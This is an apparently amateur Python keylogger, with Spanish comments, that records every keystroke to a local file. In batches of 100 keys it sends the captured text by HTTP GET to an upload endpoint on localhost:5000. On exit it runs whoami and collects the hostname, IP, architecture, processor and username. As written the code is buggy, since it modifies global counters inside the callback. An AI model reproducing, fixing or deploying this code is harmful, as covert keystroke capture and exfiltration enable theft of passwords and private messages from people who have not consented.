# python -m pip install pynput
import datetime
from pynput.keyboard import Listener, Controller
import time
import os
import socket
import platform
import getpass
import requests

# keyboard=Controller()
#response = requests.get('http://localhost:5000/upload/HolaNoraj')

d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

# def TimeOut():
#     if time.time()> timeout:
#           return True
#     else:
#           return False

time = 0
data = 'h'
def key_recorder(key):
  key=str(key)
  
  # Improvisando código :'v 
  data = key + data
  time = time + 1
  if time == 100 :
        response = requests.get('http://localhost:5000/upload/'+ data.replace("'",""))
        data = ''
        time = 0


  
  f= open('keylogger_{}.txt'.format(d),'a')

  #$response = requests.get('http://localhost:5000/upload/'+key.replace("'", ""))

  if key == 'Key.enter':
        # time = 0
    # while keyboard.release(key)==False:
    #   time = time.time() + time 

    f.write('\n')
    # f.write('\n')
    # f.write(d)
    # f.write('\n')

  elif key == 'Key.space':
        f.write(' ')
  elif key == 'Key.backspace':
        f.write('%BORRAR%')
  else:
    
    f.write(key.replace("'", ""))

  
 
  
  # SOLO PARA LA FASE DE PRUEBAS
  if key == "'\\x03'":    
    f.close()

    os.system('whoami')
    hostname = socket.gethostname()
    IP = socket.gethostbyname(hostname)
    architecture=platform.architecture()
    processor=platform.processor()
    userName = getpass.getuser()
    print("**********")
    print(hostname)
    print(IP)
    print(architecture)
    print(processor)
    print(userName)
    print("**********")
    quit()


#while True:
    #if TimeOut():
    #    f.close()
    #    Timeout=time.time() + wait_seconds
with Listener(on_press=key_recorder) as l:
  l.join()
  